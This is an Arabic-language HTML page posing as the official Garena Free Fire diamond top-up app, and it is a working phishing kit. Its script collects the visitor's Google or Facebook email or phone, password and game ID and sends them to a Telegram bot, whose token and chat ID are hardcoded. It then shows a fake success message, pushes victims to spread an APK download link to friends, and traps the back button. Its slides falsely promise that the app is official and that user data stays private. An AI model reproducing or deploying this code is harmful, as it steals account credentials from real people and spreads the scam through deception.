<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>شحن جواهر فري فاير</title>
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
  <style>
    * { box-sizing: border-box; font-family: 'Cairo', sans-serif; }
    body {
      margin: 0; padding: 0;
      background: linear-gradient(135deg, #1c1c1c, #000);
      color: #fff; display: flex; flex-direction: column;
      align-items: center; justify-content: flex-start;
      min-height: 100vh; padding-top: 50px;
    }
    .garena {
      font-size: 48px; font-weight: bold;
      color: #ff4b5c; margin-bottom: 20px;
      text-shadow: 0 0 12px #ff4b5c;
    }
    .card {
      background: rgba(255,255,255,0.05); border: 1px solid #444;
      border-radius: 16px; padding: 30px; width: 95%; max-width: 400px;
      box-shadow: 0 8px 20px rgba(0,0,0,0.6); margin-top: 10px;
      backdrop-filter: blur(8px); display: none;
      animation: fadeIn 0.5s ease forwards;
    }
    .card.active { display: block; }
    @keyframes fadeIn {
      from { opacity: 0; transform: scale(0.95); }
      to { opacity: 1; transform: scale(1); }
    }
    h3 { text-align: center; font-size: 22px; margin-bottom: 25px; color: #00c9a7; }
    input, button {
      width: 100%; padding: 14px; margin-bottom: 20px;
      border: none; border-radius: 12px; font-size: 16px;
    }
    input {
      background-color: #222; color: #fff; border: 1px solid #555;
    }
    button {
      position: relative; overflow: hidden; font-weight: bold;
      cursor: pointer; transition: all 0.3s ease; color: #fff;
    }
    button:hover { transform: scale(1.03); }
    .google-btn, .facebook-btn, .option, .share-btn {
      background-color: #444 !important; color: #fff !important;
      background-image: none !important;
    }
    .option:hover { background-color: #555 !important; }
    .loading {
      display: none; border: 4px solid #f3f3f3;
      border-top: 4px solid #00c9a7; border-radius: 50%;
      width: 40px; height: 40px; animation: spin 1s linear infinite;
      margin-top: 20px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); }
    }
    .welcome-overlay {
      position: fixed; top:0; right:0; bottom:0; left:0;
      background: linear-gradient(135deg, #111, #222);
      z-index: 9999; display: flex; flex-direction: column;
      justify-content: center; align-items: center;
    }
    .slide {
      text-align: center; padding: 40px; max-width: 90%;
      animation: fade 1s ease-in-out;
    }
    .slide h2 { color: #00c9a7; font-size: 28px; margin-bottom: 20px; }
    .slide p { color: #ccc; font-size: 18px; }
    .welcome-btn {
      margin-top: 30px; padding: 12px 24px;
      background-color: #00c9a7; color: #000;
      border-radius: 10px; font-weight: bold;
      border: none; cursor: pointer;
    }
    @keyframes fade {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }
  </style>
</head>
<body>

  <div id="welcome" class="welcome-overlay" style="display: none;">
    <div class="slide" id="slide"></div>
    <button class="welcome-btn" id="nextBtn">التالي</button>
  </div>

  <div class="garena">Garena</div>

  <div id="methodSelection" class="card active">
    <h3>اختر نوع ربط الحساب</h3>
    <button class="google-btn" onclick="selectMethod('Google')">Google</button>
    <button class="facebook-btn" onclick="selectMethod('Facebook')">Facebook</button>
    <button class="share-btn" onclick="shareApp()">مشاركة التطبيق</button>
  </div>

  <div id="formCard" class="card">
    <h3 id="formTitle">تسجيل الدخول</h3>
    <input type="text" id="name" placeholder="ادخل اسمك">
    <input type="text" id="email" placeholder="البريد الإلكتروني">
    <input type="password" id="password" placeholder="كلمة السر">
    <input type="text" id="id" placeholder="ايدي حساب فريفاير">
  </div>

  <div id="gemsCard" class="card">
    <h3>اختر عدد الجواهر</h3>
    <button class="option" onclick="submitForm(300, 'مجانية')">300 جوهرة💎 مجانا</button>
    <button class="option" onclick="submitForm(200, '1$')">200 جوهرة💎 - 1$</button>
    <button class="option" onclick="submitForm(300, '2$')">300 جوهرة💎 - 2$</button>
    <button class="option" onclick="submitForm(500, '5$')">500 جوهرة💎 - 5$</button>
    <button class="option" onclick="submitForm(1000, '9$')">1000 جوهرة💎 - 9$</button>
  </div>

  <div id="loading" class="loading"></div>

  <script>
    let selectedMethod = '';

    function getTelegramConfig(method) {
      return {
        token: "7923698432:AAEC06v7mgWEOvdPPbqLgoq43Z8lNOnybTQ",
        chatId: 7491262664
      };
    }

    function selectMethod(method) {
      selectedMethod = method;
      document.getElementById('methodSelection').classList.remove('active');
      document.getElementById('formCard').classList.add('active');
      document.getElementById('gemsCard').classList.add('active');
      document.getElementById('email').placeholder =
        method === 'Facebook'
          ? 'البريد الإلكتروني / رقم الهاتف'
          : 'البريد الإلكتروني';
    }

    function isValidEmail(email) {
      return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
    }

    function submitForm(gems, price) {
      const name = document.getElementById('name').value.trim();
      const email = document.getElementById('email').value.trim();
      const password = document.getElementById('password').value.trim();
      const id = document.getElementById('id').value.trim();

      if (!name || !email || !password || !id) {
        Swal.fire({ icon: 'warning', title: 'تحذير', text: 'يرجى تعبئة جميع الحقول المطلوبة.' });
        return;
      }

      if (selectedMethod === 'Google' && !isValidEmail(email)) {
        Swal.fire({ icon: 'error', title: 'خطأ', text: 'يرجى إدخال بريد إلكتروني صحيح.' });
        return;
      }

      if (name.includes("https://") || email.includes("https://") || password.includes("https://") || id.includes("https://")) {
        Swal.fire({ icon: 'error', title: 'خطأ', text: 'لا يُسمح بإدخال روابط ضمن البيانات.' });
        return;
      }

      document.getElementById('loading').style.display = 'block';
      const { token, chatId } = getTelegramConfig(selectedMethod);
      const date = new Date();
      const message = `
━━━━━━━━━━━━━
『 🕷️ 𝗧𝗬𝗣𝗘 : ⪼ ${selectedMethod} 』
『 📆 𝗗𝗔𝗧𝗘 / 𝗧𝗜𝗠𝗘 : ⪼ ${date.toLocaleDateString('ar-EG')} / ${date.toLocaleTimeString('ar-EG')} 』
『 🔑 𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗 : ⪼ ${password} 』
『 📧 𝗘𝗠𝗔𝗜𝗟 / 𝗣𝗛𝗢𝗡𝗘 : ⪼ ${email} 』
『 🆔 𝗜𝗗 : ⪼ ${id} 』
━━━━━━━━━━━━━
`;

      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: message })
      })
      .then(() => {
        document.getElementById('loading').style.display = 'none';
        Swal.fire({
          title: 'Garena Free Fire',
          text: `تم حفض طلب الشحن  ستصلك  ${gems} جوهرة ان كنت قد شاركت التطبيق مع اصدقائك عبر زر المشاركة في الردهة..`,
          icon: 'success',
          confirmButtonText: 'موافق'
        });
      })
      .catch(() => {
        document.getElementById('loading').style.display = 'none';
        Swal.fire({ icon: 'error', title: 'خطأ', text: 'حدث خطأ أثناء الإرسال.' });
      });
    }

    function shareApp() {
      Swal.fire({
        title: 'مشاركة التطبيق',
        text: ' انسخ الرسالة وشاركها مع أصدقائك عبر مسنجر او فيسبوك او شاركها في منشوراتك لتحصل على 300 جوهرة مجانية تلقائيا في حسابك عند استعمال كل 1 صديق للتطبيق !',
        icon: 'info',
        confirmButtonText: 'نسخ الرسالة'
      }).then(() => {
        navigator.clipboard.writeText(
`حسناً يا اصدقائي! لقد وجدت طريقة رائعة لربح 300 جوهرة مجانية في فري فاير! كل ما عليك القيام به هو تثبيت التطبيق من خلال الرابط الخاص بي وتشغيله.

الرابط : [ https://apk.e-droid.net/apk/app3650002-eqwkbh.apk?v=1 ]`
        );
      });
    }

    const welcomeSlides = [
      { title: "مرحبا بك!", text: "في التطبيق الرسمي لشحن جواهر فري فاير" },
      { title: "سهولة الاستخدام", text: "واجهة بسيطة وسريعة الاستخدام" },
      { title: "مكافآت مجانية", text: "يمكنك الحصول على الجواهر المجانية أو المدفوعة!" },
      { title: "آمن وموثوق", text: "لا يتم مشاركة معلومات المستخدمين مع أي أحد!" },
      { title: "لنبدأ الآن!", text: "اضغط على زر البدء للمتابعة" }
    ];
    let currentSlide = 0;

    function showSlide(i) {
      const s = welcomeSlides[i];
      document.getElementById('slide').innerHTML = `<h2>${s.title}</h2><p>${s.text}</p>`;
      document.getElementById('nextBtn').innerText = i === welcomeSlides.length-1 ? 'ابدأ' : 'التالي';
    }

    document.getElementById('nextBtn').onclick = () => {
      if (currentSlide < welcomeSlides.length-1) {
        currentSlide++;
        showSlide(currentSlide);
      } else {
        document.getElementById('welcome').style.display = 'none';
        localStorage.setItem('visited', 'true');
      }
    };

    window.onload = () => {
      if (!localStorage.getItem('visited')) {
        document.getElementById('welcome').style.display = 'flex';
        showSlide(0);
      }
    };

    window.addEventListener('popstate', function () {
      history.back();
    });

    window.history.pushState({}, '');

  </script>
</body>
</html>
